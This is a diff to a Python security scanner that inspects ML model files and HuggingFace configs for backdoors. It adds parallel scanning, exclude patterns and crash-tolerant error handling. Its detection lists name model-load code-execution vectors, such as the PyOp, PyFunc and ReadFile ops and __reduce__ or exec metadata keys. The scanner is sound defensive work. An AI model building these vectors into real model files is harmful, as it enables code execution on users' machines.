-# ── Minimal schema-less protobuf walker (ONNX + TF SavedModel) ──────
-#
-# Both formats are protobuf messages (onnx.ModelProto / tensorflow.GraphDef),
-# but pulling in the `onnx`/`protobuf` packages as a hard dependency just to
-# read op names and path strings out of a possibly-malicious model file is
-# more surface area than this needs. Protobuf's wire format is fully
-# self-describing enough to walk generically without the .proto schema: each
-# field is a (field_number, wire_type) varint key followed by a
-# type-appropriate value, and a "wire_type 2" (length-delimited) field is
-# either a string/bytes leaf or a nested submessage -- ambiguous without the
-# schema, so this walks it both ways (recurse if it parses as a submessage,
-# also try it as UTF-8 text) rather than guessing.
-
-def _read_varint(data: bytes, i: int) -> tuple[int, int]:
-    result = 0
-    shift = 0
-    while True:
-        if i >= len(data):
-            raise IndexError("truncated varint")
-        b = data[i]
-        i += 1
-        result |= (b & 0x7F) << shift
-        if not (b & 0x80):
-            return result, i
-        shift += 7
-        if shift > 70:
-            raise ValueError("varint too long")
-
-
-def _iter_protobuf_fields(data: bytes):
-    """Yield (field_number, wire_type, value) for each top-level field.
-
-    Tolerates truncated/malformed input by stopping early (not raising) --
-    this walks attacker-controlled files, so a deliberately corrupted
-    protobuf blob must degrade to "found nothing further", never a crash.
-    Bails on wire types 3/4 (deprecated start/end group) rather than risk
-    misinterpreting the rest of the stream.
-    """
-    i = 0
-    n = len(data)
-    while i < n:
-        try:
-            key, i = _read_varint(data, i)
-        except (IndexError, ValueError):
-            return
-        wire_type = key & 0x7
-        field_num = key >> 3
-        if wire_type == 0:
-            try:
-                val, i = _read_varint(data, i)
-            except (IndexError, ValueError):
-                return
-            yield field_num, wire_type, val
-        elif wire_type == 1:
-            if i + 8 > n:
-                return
-            yield field_num, wire_type, data[i : i + 8]
-            i += 8
-        elif wire_type == 2:
-            try:
-                length, i = _read_varint(data, i)
-            except (IndexError, ValueError):
-                return
-            if length < 0 or i + length > n:
-                return
-            yield field_num, wire_type, data[i : i + length]
-            i += length
-        elif wire_type == 5:
-            if i + 4 > n:
-                return
-            yield field_num, wire_type, data[i : i + 4]
-            i += 4
-        else:
-            return
-
-
-def _extract_protobuf_strings(data: bytes, max_depth: int = 12) -> list[str]:
-    """Recursively collect every printable UTF-8 string found in any
-    length-delimited field, at any nesting depth -- op names, custom-op
-    attribute values, and external-data path references all show up as
-    plain string leaves somewhere in this tree, regardless of which message
-    type actually declares them (which we don't know, schema-less)."""
-    strings: list[str] = []
-    if max_depth <= 0:
-        return strings
-    for _field_num, wire_type, value in _iter_protobuf_fields(data):
-        if wire_type != 2 or not isinstance(value, (bytes, bytearray)):
-            continue
-        sub_fields = list(_iter_protobuf_fields(value))
-        if sub_fields:
-            strings.extend(_extract_protobuf_strings(bytes(value), max_depth - 1))
-        try:
-            text = value.decode("utf-8")
-        except UnicodeDecodeError:
-            continue
-        if text and text.isprintable():
-            strings.append(text)
-    return strings
-
-
-# ONNX custom ops with documented code-execution behavior (onnxruntime-extensions'
-# PyOp/PythonOp embeds a Python callable, by name or source, that runs at
-# inference time -- this is the real, previously-exploited ONNX RCE vector,
-# not a hypothetical).
-ONNX_DANGEROUS_OPS: frozenset[str] = frozenset({"PyOp", "PythonOp", "Inference"})
-
-# TensorFlow ops that read/write the filesystem or run an embedded Python
-# callable at graph-execution time -- the same class of "presence is the
-# signal" evidence as MFV-KERAS-001's Lambda-layer check.
-#
-# Deliberately NOT in this set: ShardedFilename and MergeV2Checkpoints.
-# tf.train.Saver adds both to a graph's save/restore machinery, so they
-# appear in the MetaGraphDef of ordinary SavedModels as checkpoint
-# boilerplate and run only when the save/restore ops are explicitly
-# invoked, never at inference. Their presence carries no signal.
-TF_DANGEROUS_OPS: frozenset[str] = frozenset({
-    "PyFunc", "PyFuncStateless", "ReadFile", "WriteFile",
-})
-
-# The only keys ONNX's TensorProto.external_data map (StringStringEntryProto)
-# can legitimately carry. Before onnx 1.21.0 (CVE-2026-34445) these keys were
-# passed to setattr() on the ExternalDataInfo object, so a key outside this
-# set overwrote internal properties. A file carrying one is never legitimate.
-_ONNX_EXTERNAL_DATA_KEYS: frozenset[str] = frozenset(
-    {"location", "offset", "length", "checksum"}
-)
-
-# Absolute path shapes that escape the model's directory just as surely as a
-# ".." segment: POSIX root (but not the protocol-relative "//"), UNC, and
-# drive-letter paths. Checked only against external_data location values,
-# never whole-file: ONNX node names are hierarchical scope paths that begin
-# with "/" by convention ("/bert/Cast"), so a leading slash anywhere else is
-# the naming scheme, not a path.
-_ONNX_ABSOLUTE_PATH_RE = re.compile(r"^(?:/[^/]|\\\\|[A-Za-z]:[\\/])")
-
-# Anything that is not a plain relative filename: a scheme, a UNC path,
-# or a protocol-relative reference.
-_ONNX_REMOTE_LOCATION_RE = re.compile(
-    r"^(?:[a-zA-Z][a-zA-Z0-9+.-]*://|//|\\\\\\\\)"
-)
-
-
-def _string_string_entry(value: bytes) -> tuple[str, str] | None:
-    """If `value` parses as a StringStringEntryProto {key: 1, value: 2} with
-    exactly those two fields and both decode as UTF-8, return (key, value),
-    else None. Anything richer is some other message and not ours to read."""
-    key: str | None = None
-    val: str | None = None
-    for field_num, wire_type, field_value in _iter_protobuf_fields(value):
-        if wire_type != 2 or not isinstance(field_value, (bytes, bytearray)):
-            return None
-        try:
-            text = bytes(field_value).decode("utf-8")
-        except UnicodeDecodeError:
-            return None
-        if field_num == 1:
-            key = text
-        elif field_num == 2:
-            val = text
-        else:
-            return None
-    if key is None:
-        return None
-    return key, val if val is not None else ""
-
-
-def _onnx_external_data_maps(data: bytes, max_depth: int = 12) -> list[dict[str, str]]:
-    """Collect message-shaped regions that look like a TensorProto's repeated
-    external_data map. The walk is schema-less, so the anchor is the map's own
-    contents: a StringStringEntry map carrying a "location" key is, in an ONNX
-    file, external_data with overwhelming probability (ModelProto.metadata_props,
-    the only other such map in common use, keys on author/license/converted_by,
-    not "location")."""
-    maps: list[dict[str, str]] = []
-    if max_depth <= 0:
-        return maps
-    entries: dict[str, str] = {}
-    for _field_num, wire_type, value in _iter_protobuf_fields(data):
-        if wire_type != 2 or not isinstance(value, (bytes, bytearray)):
-            continue
-        entry = _string_string_entry(bytes(value))
-        if entry is not None:
-            entries[entry[0]] = entry[1]
-        else:
-            maps.extend(_onnx_external_data_maps(bytes(value), max_depth - 1))
-    if "location" in entries:
-        maps.append(entries)
-    return maps
 
 
 def _skip_unverified_finding(
@@ -2958,9 +308,7 @@ def _skip_unverified_finding(
         severity=Severity.LOW,
         category=Category.AI_ML,
         file_path=str(file_path),
-        start_line=0,
         confidence=0.50,
-        engine="mfv",
         metadata=metadata or {},
     )
 
@@ -2982,16 +330,6 @@ class ModelFormat(str, Enum):
     SEVENZ = "sevenz"
     PMML = "pmml"
     UNKNOWN = "unknown"
-
-
-@dataclass
-class ModelFileFinding:
-    path: str
-    format: ModelFormat
-    severity: Severity
-    message: str
-    evidence: str = ""
-    details: dict[str, Any] = field(default_factory=dict)
 
 
 # Directory names never worth walking: version control, virtualenvs, build
@@ -3045,11 +383,158 @@ def _new_decompressor(kind: str):
     return lzma.LZMADecompressor(format=lzma.FORMAT_ALONE)
 
 
+def _zip_blob_upto_archive_end(blob: bytes) -> bytes:
+    """Trim trailing garbage past a zip archive's own EOCD.
+
+    The raw member fallback reads up to the size cap because the declared
+    member size is attacker-controlled and may be a lie; for a STORED member
+    that means the read can run on into whatever follows the member in the
+    outer container (its central directory, another member). A nested zip
+    handed to zipfile with that garbage attached enumerates the *outer*
+    archive's directory instead and never sees the inner payload.
+
+    Re-derives the archive's true end from the structure itself: a run of
+    local file headers, then the central directory, then the EOCD. Every
+    length walked comes from a *local* record the attacker would have to
+    forge a second time independently of the central-directory lie. Any
+    inconsistency returns the blob unchanged -- never worse than before.
+    """
+    pos = 0
+    n = len(blob)
+    while pos + 30 <= n and blob[pos:pos + 4] == b"PK\x03\x04":
+        name_len, extra_len = struct.unpack("<HH", blob[pos + 26:pos + 30])
+        (comp_size,) = struct.unpack("<I", blob[pos + 18:pos + 22])
+        pos += 30 + name_len + extra_len + comp_size
+        if pos > n:
+            return blob
+    if pos + 4 > n or blob[pos:pos + 4] != b"PK\x01\x02":
+        return blob
+    while pos + 46 <= n and blob[pos:pos + 4] == b"PK\x01\x02":
+        name_len, extra_len, cmt_len = struct.unpack("<HHH", blob[pos + 28:pos + 34])
+        pos += 46 + name_len + extra_len + cmt_len
+        if pos > n:
+            return blob
+    if pos + 22 <= n and blob[pos:pos + 4] == b"PK\x05\x06":
+        (cmt_len,) = struct.unpack("<H", blob[pos + 20:pos + 22])
+        end = pos + 22 + cmt_len
+        if end <= n:
+            return blob[:end]
+    return blob
+
+
+# Sentinel the raw zip reader returns (only when a caller opts in via
+# report_oversized) to mean "this member decompresses past MAX_ZIP_MEMBER_BYTES"
+# as distinct from None, which stays "unreadable / not located". The strict
+# read path already reports the oversized case as MFV-PICKLE-003; this lets the
+# raw fallback reach the same verdict instead of skipping the member silently.
+_ZIP_MEMBER_OVERSIZED = object()
+
+
+# Called once per completed file as (done, total, path). The scanner never
+# writes progress itself: it hands these numbers to a caller-supplied callback
+# so the cli can route them to stderr and stdout stays a clean report.
+ProgressCallback = Callable[[int, int, Path], None]
+
+
+def _path_excluded(path: Path, root: Path, patterns: list[str]) -> bool:
+    """True if `path` matches any --exclude glob, tested as the file is walked.
+
+    A pattern is matched (fnmatch) against three views of the path: its route
+    relative to the scan root, its bare filename, and every individual path
+    component. The component test is what lets a directory-name pattern such as
+    `checkpoints` prune everything beneath that directory, not just a file
+    literally named `checkpoints`.
+    """
+    try:
+        relative = path.relative_to(root)
+    except ValueError:
+        relative = path
+    candidates = [relative.as_posix(), path.name, *relative.parts]
+    for pattern in patterns:
+        for candidate in candidates:
+            if fnmatch(candidate, pattern):
+                return True
+    return False
+
+
+@dataclass(frozen=True)
+class _ScanConfig:
+    """The scanner state a worker process must reproduce to scan identically.
+
+    Only these two settings change a file's findings, so they are the only
+    thing shipped to workers. A frozen dataclass is picklable, which a closure
+    over the parent scanner would not be.
+    """
+
+    max_scan_bytes: int
+    check_signatures: bool
+
+
+# One configured scanner per worker process, built by the pool initializer and
+# reused for every task that worker handles, so the format map and config are
+# constructed once rather than per file.
+_WORKER_SCANNER: ModelFileScanner | None = None
+
+
+def _worker_init(config: _ScanConfig) -> None:
+    """ProcessPoolExecutor initializer: stand up this worker's scanner once."""
+    global _WORKER_SCANNER
+    scanner = ModelFileScanner()
+    # Instance attribute shadows the class constant for this run, exactly as
+    # the cli's --max-size does in the main process.
+    scanner.MAX_SCAN_BYTES = config.max_scan_bytes
+    scanner.check_signatures = config.check_signatures
+    _WORKER_SCANNER = scanner
+
+
+def _worker_scan(path_str: str) -> list[Finding]:
+    """Scan one file in a worker. Paths cross the process boundary as strings
+    (a Path pickles fine too, but a str is unambiguous and cheap)."""
+    if _WORKER_SCANNER is None:  # _worker_init always runs before any task
+        raise RuntimeError("worker scanner was not initialized")
+    return _WORKER_SCANNER.scan_file(Path(path_str))
+
+
+def _scan_paths_parallel(
+    files: list[Path],
+    config: _ScanConfig,
+    jobs: int,
+    progress: ProgressCallback | None = None,
+) -> list[tuple[Path, list[Finding]]]:
+    """Scan `files` across a process pool and return per-file results.
+
+    Results are gathered as futures complete (order is irrelevant, the report
+    re-sorts), but every submitted file appears exactly once in the output, so
+    the parallel result is the same set of findings the sequential scan
+    produces.
+    """
+    total = len(files)
+    results: list[tuple[Path, list[Finding]]] = []
+    with ProcessPoolExecutor(
+        max_workers=jobs, initializer=_worker_init, initargs=(config,)
+    ) as executor:
+        future_to_path = {
+            executor.submit(_worker_scan, str(f)): f for f in files
+        }
+        done = 0
+        for future in as_completed(future_to_path):
+            path = future_to_path[future]
+            file_findings = future.result()
+            done += 1
+            if progress is not None:
+                progress(done, total, path)
+            results.append((path, file_findings))
+    return results
+
+
 class ModelFileScanner:
     """Scans ML model files for backdoors and unsafe content."""
 
-    MAX_SCAN_BYTES = 500_000_000  # 500 MB; larger files are streamed or skipped
-    MAX_ZIP_MEMBER_BYTES = 200_000_000  # 200 MB cap on decompressed pickle members
+    # Annotated as int (not the inferred Literal) because both are overridden
+    # per instance: --max-size shadows MAX_SCAN_BYTES for a run, and tests
+    # lower MAX_ZIP_MEMBER_BYTES to exercise the bomb caps.
+    MAX_SCAN_BYTES: int = 500_000_000  # 500 MB; larger files are streamed or skipped
+    MAX_ZIP_MEMBER_BYTES: int = 200_000_000  # 200 MB cap on decompressed pickle members
 
     # Extensions too generic to map to a format, but too commonly used by real
     # model files for a directory walk to skip. `.bin` is `pytorch_model.bin`,
@@ -3063,13 +548,39 @@ class ModelFileScanner:
     # sniff, so it does not consult it.
     _AMBIGUOUS_EXTENSIONS: frozenset[str] = frozenset({".bin", ".zip"})
 
+    # HuggingFace / transformers config files. These carry the auto_map,
+    # trust_remote_code and chat_template RCE vectors (MFV-HF-001/002), and
+    # they are always `*.json`. `.json` is not in `_format_map` because it is
+    # not dispatched by magic bytes: `_scan_file_dispatch` routes a `.json`
+    # only when its bytes parse as a JSON object. But a directory scan still has
+    # to *find* them, or a downloaded model repo (the normal way this runs) is
+    # reported clean while carrying the exact vectors this catches. The scan is
+    # cheap and false-positive-safe: `_scan_json_config` fires only on those
+    # three fields, so an unrelated `package.json` yields nothing.
+    _CONFIG_EXTENSIONS: frozenset[str] = frozenset({".json"})
+
     def __init__(self):
+        self._archive_depth = 0
+        # Opt-in provenance pass. Off by default so an ordinary scan says
+        # nothing about signatures; the CLI's --check-signatures turns it on,
+        # and then every scanned file also gets an MFV-SIG-001 note when a
+        # sibling signature or attestation artifact is present (see
+        # hayward.signatures). Detection only: this tool does no cryptographic
+        # verification and claims none.
+        self.check_signatures = False
         self._format_map: dict[str, ModelFormat] = {
             ".pkl": ModelFormat.PICKLE,
             ".pickle": ModelFormat.PICKLE,
             ".pth": ModelFormat.PICKLE,
             ".pt": ModelFormat.PICKLE,
             ".ckpt": ModelFormat.PICKLE,
+            # PyTorch Lite / mobile (`.ptl`): torch.jit's mobile export writes
+            # a zip that wraps a pickle exactly like a `.pt` checkpoint, and
+            # the on-device interpreter unpickles it on load. Same container,
+            # same threat, so it takes the same PICKLE handling (which routes a
+            # real zip through _scan_pytorch_zip and a flat pickle through the
+            # opcode walk).
+            ".ptl": ModelFormat.PICKLE,
             # `.th` is a torch checkpoint suffix in real use (OpenCLIP and
             # several eval harnesses write `*_stats.th`), and torch.load reads
             # it like any other checkpoint -- zip-wrapped or flat pickle. Both
@@ -3124,7 +635,54 @@ class ModelFileScanner:
 
 
     def scan_file(self, file_path: Path) -> list[Finding]:
-        """Scan a single model file."""
+        """Scan a single model file.
+
+        Never raises on input problems: any failure degrades to an
+        MFV-SKIP-003 coverage finding instead of propagating, because one
+        crashing file aborts the whole directory scan -- crash-as-evasion
+        (arXiv 2508.19774), and a directory walk is how this tool is
+        actually run. KeyboardInterrupt and SystemExit derive from
+        BaseException, not Exception, and propagate untouched.
+        """
+        try:
+            findings = self._scan_file_dispatch(file_path)
+        except OSError:
+            findings = [_skip_unverified_finding(
+                file_path,
+                "The file could not be read, so it was never scanned.",
+                metadata={"skipped_reason": "unreadable"},
+            )]
+        except Exception as exc:
+            logger.debug("scan_file failed on %s: %s", file_path, exc)
+            findings = [_skip_unverified_finding(
+                file_path,
+                f"The scan failed with an unexpected error "
+                f"({type(exc).__name__}), so the file was never fully analysed.",
+                metadata={"skipped_reason": "scan_error",
+                          "error": type(exc).__name__},
+            )]
+
+        if self.check_signatures:
+            # A provenance note, never a gate: report any sibling signature or
+            # attestation. Detection cannot be allowed to break the scan, so it
+            # runs inside the same firewall the dispatch does.
+            try:
+                artifacts = find_signature_artifacts(file_path)
+                findings = findings + signature_findings(file_path, artifacts)
+            except Exception as exc:                         # noqa: BLE001
+                logger.debug("signature check failed on %s: %s", file_path, exc)
+
+        return findings
+
+    def _scan_file_dispatch(self, file_path: Path) -> list[Finding]:
+        """The scan_file body, wrapped by the exception firewall above."""
+        # Before any format dispatch: a Git LFS pointer is a placeholder a
+        # few lines long, whatever extension it wears, and the content it
+        # stands in for was never fetched. Reading it further scans nothing.
+        lfs_finding = _lfs_pointer_finding(file_path)
+        if lfs_finding is not None:
+            return [lfs_finding]
+
         ext = file_path.suffix.lower()
         fmt = self._format_map.get(ext, ModelFormat.UNKNOWN)
 
@@ -3218,9 +776,7 @@ class ModelFileScanner:
                 severity=Severity.LOW,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.50,
-                engine="mfv",
                 metadata={"file_size": file_size, "skipped_reason": "oversized"},
             )]
 
@@ -3232,6 +788,32 @@ class ModelFileScanner:
                 "The file could not be read, so it was never scanned.",
                 metadata={"skipped_reason": "unreadable"},
             )]
+
+        # HW-142: transformers reads its RCE-bearing configuration from
+        # standalone *.json files (tokenizer_config.json, chat_template.json,
+        # config.json), never from a model binary. Those carry a `.json`
+        # extension, which `_format_map` does not name, so they reach here as
+        # UNKNOWN and would otherwise fall to the content sniff, which has no
+        # JSON-config signature and returns []. Route a `.json` file whose
+        # bytes parse as a JSON *object* to the config scanner. Gated on the
+        # `.json` extension deliberately: a transformers config is always
+        # named `*.json`, and sniffing every '{'-led blob in a tree as a model
+        # config would false-positive on the unrelated JSON that litters a
+        # repo (package manifests, tokenizer vocab, dataset shards).
+        if file_path.suffix.lower() == ".json":
+            try:
+                # json.loads takes bytes directly and auto-detects the UTF
+                # encoding. The catch set mirrors the other bounded JSON parses
+                # in this file: deeply nested input raises RecursionError /
+                # MemoryError, malformed or non-UTF input raises the decode /
+                # value errors. A `.json` we cannot parse as an object is not
+                # evidence of a config, so it degrades to "not scanned" here.
+                parsed = json.loads(data)
+            except (UnicodeDecodeError, json.JSONDecodeError, RecursionError,
+                    ValueError, MemoryError):
+                parsed = None
+            if isinstance(parsed, dict):
+                return self._scan_json_config(file_path, parsed)
 
         if fmt == ModelFormat.UNKNOWN:
             # Every extension the map doesn't name lands here, ambiguous
@@ -3323,10 +905,8 @@ class ModelFileScanner:
             severity=Severity.HIGH,
             category=Category.AI_ML,
             file_path=str(file_path),
-            start_line=0,
             confidence=0.8,
             cwe_ids=[506],
-            engine="mfv",
             metadata={"embedded": hits[:10], **({"zip_member": member} if member else {})},
         )
 
@@ -3446,9 +1026,7 @@ class ModelFileScanner:
             severity=Severity.HIGH,
             category=Category.AI_ML,
             file_path=str(file_path),
-            start_line=0,
             confidence=0.8,
-            engine="mfv",
             metadata={
                 "extension_format": extension_fmt.value,
                 "sniffed_format": sniffed_fmt.value,
@@ -3525,7 +1103,8 @@ class ModelFileScanner:
             if 0 < header_size <= 100_000_000 and 8 + header_size <= len(data):
                 try:
                     parsed = json.loads(data[8:8 + header_size].decode("utf-8"))
-                except (json.JSONDecodeError, UnicodeDecodeError):
+                except (UnicodeDecodeError, json.JSONDecodeError, RecursionError,
+                        ValueError, MemoryError):
                     parsed = None
                 if isinstance(parsed, dict):
                     return ModelFormat.SAFETENSORS
@@ -3571,20 +1150,29 @@ class ModelFileScanner:
 
         return None
 
-    def scan_directory(self, root: Path) -> list[Finding]:
-        """Recursively scan a directory for model files."""
-        findings: list[Finding] = []
+    def discover_files(
+        self, root: Path, exclude: list[str] | None = None
+    ) -> list[Path]:
+        """Return every scannable model file under `root`, in walk order.
+
+        Split out from scan_directory so the caller can see the file list
+        before scanning: the cli needs it to compose the content cache (serve
+        cache hits, scan only misses) and to drive a single progress total
+        across several targets. The discovery rules are exactly what
+        scan_directory used to inline.
+        """
         root_resolved = root.resolve()
         # An earlier version matched skip names against substrings of the
         # whole path and excluded only `.git` and `__pycache__`, so it walked
         # the target's installed dependencies. Match on path *components*
         # instead, so a directory whose name merely contains "bundle" is kept.
         skip_dirs = SKIP_DIR_NAMES
+        files: list[Path] = []
         # Directory discovery must cover the same extension set scan_file
         # accepts, including the ambiguous ones it resolves by content sniff --
         # otherwise a pytorch_model.bin is scannable when named directly but
         # invisible to a directory scan, which is how the tool is actually run.
-        for ext in (*self._format_map, *self._AMBIGUOUS_EXTENSIONS):
+        for ext in (*self._format_map, *self._AMBIGUOUS_EXTENSIONS, *self._CONFIG_EXTENSIONS):
             for f in root.rglob(f"*{ext}"):
                 # rglob matches directories too. Model caches routinely name a
                 # directory after the file it holds (`<repo>--model.joblib/`),
@@ -3598,6 +1186,11 @@ class ModelFileScanner:
                     parts = f.parts
                 if any(p in skip_dirs for p in parts):
                     continue
+                # User excludes are matched against the path as walked (its
+                # path relative to the scan root) and against every single
+                # component, so a directory-name pattern prunes the subtree.
+                if exclude and _path_excluded(f, root, exclude):
+                    continue
                 # Skip symlinks whose target escapes the scan root, so a
                 # hostile repo can't get files outside the target read as
                 # model-file findings (CWE-59/22).
@@ -3608,8 +1201,66 @@ class ModelFileScanner:
                             continue
                     except OSError:
                         continue
-                findings.extend(self.scan_file(f))
+                files.append(f)
+        return files
+
+    def scan_directory(
+        self,
+        root: Path,
+        *,
+        jobs: int = 1,
+        exclude: list[str] | None = None,
+        progress: ProgressCallback | None = None,
+    ) -> list[Finding]:
+        """Recursively scan a directory for model files.
+
+        `jobs` > 1 fans the discovered files out across a process pool;
+        `jobs` <= 1 stays fully sequential (the default, so nothing changes for
+        existing callers). `exclude` drops files matching any glob pattern.
+        `progress`, if given, is called once per completed file with
+        (done, total, path) so a caller can report progress without the
+        scanner ever writing to a stream itself.
+        """
+        files = self.discover_files(root, exclude)
+        results = self._scan_paths(files, jobs=jobs, progress=progress)
+        findings: list[Finding] = []
+        for _path, file_findings in results:
+            findings.extend(file_findings)
         return findings
+
+    def _scan_paths(
+        self,
+        files: list[Path],
+        *,
+        jobs: int = 1,
+        progress: ProgressCallback | None = None,
+    ) -> list[tuple[Path, list[Finding]]]:
+        """Scan an explicit list of files, sequentially or across a pool.
+
+        Returns per-file results (path, findings) so the caller can attribute
+        each file's findings, which the content cache needs to store a miss
+        under that file's hash. Ordering of the returned list does not affect
+        the report (it re-sorts), but no file is dropped or double-counted.
+        """
+        total = len(files)
+        if jobs is None or jobs <= 1:
+            results: list[tuple[Path, list[Finding]]] = []
+            for index, f in enumerate(files, 1):
+                file_findings = self.scan_file(f)
+                if progress is not None:
+                    progress(index, total, f)
+                results.append((f, file_findings))
+            return results
+        # Parallel path. The worker config must reach every worker process
+        # (closures are not picklable), so it is carried in a small frozen
+        # dataclass and rebuilt into a configured scanner once per worker by
+        # the pool initializer. max_size and check_signatures are the only
+        # state a worker's scan_file depends on.
+        config = _ScanConfig(
+            max_scan_bytes=self.MAX_SCAN_BYTES,
+            check_signatures=self.check_signatures,
+        )
+        return _scan_paths_parallel(files, config, jobs, progress)
 
     # ── Pickle scanning ───────────────────────────────────────────
 
@@ -3647,10 +1298,8 @@ class ModelFileScanner:
                 severity=Severity.CRITICAL,
                 category=Category.DESERIALIZATION,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.9,
                 cwe_ids=[502],
-                engine="mfv",
                 metadata={"nested_globals": embedded},
             ))
 
@@ -3674,10 +1323,8 @@ class ModelFileScanner:
                     severity=Severity.HIGH,
                     category=Category.DESERIALIZATION,
                     file_path=str(file_path),
-                    start_line=0,
                     confidence=0.5,
                     cwe_ids=[502],
-                    engine="mfv",
                     metadata={"signatures": raw_hits, "file_size": len(data), "unparseable": True},
                 ))
             else:
@@ -3694,6 +1341,17 @@ class ModelFileScanner:
                 # report. This is loader parity, not a blind spot.
                 pass
             return findings
+
+        if memo_profile.walk_budget_exceeded:
+            # The walk terminated on its stack budget, not on a STOP opcode:
+            # whatever sat past that point was never read, and saying nothing
+            # would claim a complete analysis of a stream that was not one.
+            findings.append(_skip_unverified_finding(
+                file_path,
+                "The pickle walk exceeded its simulated-stack budget, so the "
+                "stream past that point was never read.",
+                {"skipped_reason": "pickle_walk_budget", "file_size": len(data)},
+            ))
 
         denied = sorted({g for g in globals_found if _classify_pickle_global(g) == "denied"})
         unknown = sorted({g for g in globals_found if _classify_pickle_global(g) == "unknown"})
@@ -3761,10 +1419,9 @@ class ModelFileScanner:
                 f"{calls_by_ref[ref].format()} [{reason}]"
                 for ref, (_sev, reason) in sorted(allowed_evidence.items())
             )
-            worst = max(
+            worst = min(
                 (sev for sev, _ in allowed_evidence.values()),
-                key=lambda s: list(_PICKLE_UNKNOWN_TIERS).index(s)
-                if s in _PICKLE_UNKNOWN_TIERS else -1,
+                key=lambda s: _SEVERITY_ORDER.get(s, len(_SEVERITY_ORDER)),
             )
             findings.append(Finding(
                 rule_id="MFV-PICKLE-006",
@@ -3776,10 +1433,8 @@ class ModelFileScanner:
                 severity=worst,
                 category=Category.DESERIALIZATION,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.65,
                 cwe_ids=[502],
-                engine="mfv",
                 metadata={
                     "allowed_globals": sorted(allowed_evidence),
                     "file_size": len(data),
@@ -3807,10 +1462,8 @@ class ModelFileScanner:
                 severity=Severity.CRITICAL,
                 category=Category.DESERIALIZATION,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.95,
                 cwe_ids=[502],
-                engine="mfv",
                 metadata={
                     "denied_globals": denied,
                     "file_size": len(data),
@@ -3851,10 +1504,8 @@ class ModelFileScanner:
                     severity=severity,
                     category=Category.DESERIALIZATION,
                     file_path=str(file_path),
-                    start_line=0,
                     confidence=confidence,
                     cwe_ids=[502],
-                    engine="mfv",
                     metadata={
                         "unknown_globals": refs,
                         "file_size": len(data),
@@ -3884,10 +1535,8 @@ class ModelFileScanner:
                     severity=Severity.INFO,
                     category=Category.DESERIALIZATION,
                     file_path=str(file_path),
-                    start_line=0,
                     confidence=0.3,
                     cwe_ids=[502],
-                    engine="mfv",
                     metadata={
                         "unknown_globals": residual,
                         "file_size": len(data),
@@ -3917,10 +1566,8 @@ class ModelFileScanner:
                 severity=Severity.HIGH,
                 category=Category.DESERIALIZATION,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.75,
                 cwe_ids=[502],
-                engine="mfv",
                 metadata={
                     "out_of_band_memo_indices": list(oob[:20]),
                     "out_of_band_count": len(oob),
@@ -3945,9 +1592,7 @@ class ModelFileScanner:
                 severity=Severity.HIGH,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.95,
-                engine="mfv",
             )]
 
         # Read header size (first 8 bytes, little-endian u64)
@@ -3960,9 +1605,7 @@ class ModelFileScanner:
                 severity=Severity.HIGH,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.90,
-                engine="mfv",
             )]
 
         if 8 + header_size > len(data):
@@ -3972,24 +1615,23 @@ class ModelFileScanner:
                 severity=Severity.HIGH,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.95,
-                engine="mfv",
             )]
 
         # Parse JSON header
         try:
             header = json.loads(data[8:8 + header_size].decode("utf-8"))
-        except (json.JSONDecodeError, UnicodeDecodeError):
+        except (UnicodeDecodeError, json.JSONDecodeError, RecursionError,
+                ValueError, MemoryError):
+            # Deeply nested header JSON raises RecursionError/MemoryError
+            # rather than JSONDecodeError; same catch set as the skops path.
             return [Finding(
                 rule_id="MFV-ST-004",
                 message="SafeTensors header is not valid JSON. Corrupted or maliciously crafted.",
                 severity=Severity.HIGH,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.95,
-                engine="mfv",
             )]
 
         layout_problems = _check_safetensors_layout(
@@ -4004,18 +1646,25 @@ class ModelFileScanner:
                 severity=Severity.HIGH,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.8,
                 cwe_ids=[787],
-                engine="mfv",
                 metadata={"layout_problems": layout_problems[:20]},
             ))
 
         # Validate metadata, flagging suspicious keys
         suspicious_keys: list[str] = []
-        for key in header.get("__metadata__", {}):
-            if any(d in key.lower() for d in ("__reduce__", "__builtins__", "exec", "eval", "import")):
-                suspicious_keys.append(key)
+        metadata = header.get("__metadata__", {})
+        if isinstance(metadata, dict):
+            for key in metadata:
+                if not isinstance(key, str):
+                    continue
+                lowered = key.lower()
+                if (
+                    "__reduce__" in lowered
+                    or "__builtins__" in lowered
+                    or _ST_METADATA_DANGEROUS_KEY_RE.search(lowered)
+                ):
+                    suspicious_keys.append(key)
 
         if suspicious_keys:
             findings.append(Finding(
@@ -4025,9 +1674,7 @@ class ModelFileScanner:
                 severity=Severity.CRITICAL,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.90,
-                engine="mfv",
                 metadata={"suspicious_keys": suspicious_keys},
             ))
 
@@ -4062,9 +1709,7 @@ class ModelFileScanner:
                 severity=Severity.HIGH,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.95,
-                engine="mfv",
             )]
 
         layout_problems = _check_gguf_layout(data)
@@ -4079,15 +1724,13 @@ class ModelFileScanner:
                 severity=Severity.HIGH,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.8,
                 cwe_ids=[787, 190],
-                engine="mfv",
                 metadata={"layout_problems": layout_problems[:20]},
             ))
 
         try:
-            kv = _parse_gguf_metadata(data, GGUF_METADATA_SCAN_BYTES)
+            kv, kv_window_truncated = _parse_gguf_metadata(data, GGUF_METADATA_SCAN_BYTES)
         except (ValueError, struct.error, IndexError, OverflowError) as e:
             logger.debug("GGUF metadata parse failed for %s: %s", file_path, e)
             if not any(f.rule_id == "MFV-GGUF-005" for f in findings):
@@ -4103,9 +1746,7 @@ class ModelFileScanner:
                     severity=Severity.INFO,
                     category=Category.AI_ML,
                     file_path=str(file_path),
-                    start_line=0,
                     confidence=0.3,
-                    engine="mfv",
                 ))
             return findings
 
@@ -4140,9 +1781,7 @@ class ModelFileScanner:
                 severity=Severity.CRITICAL,
                 category=Category.AI_ML,
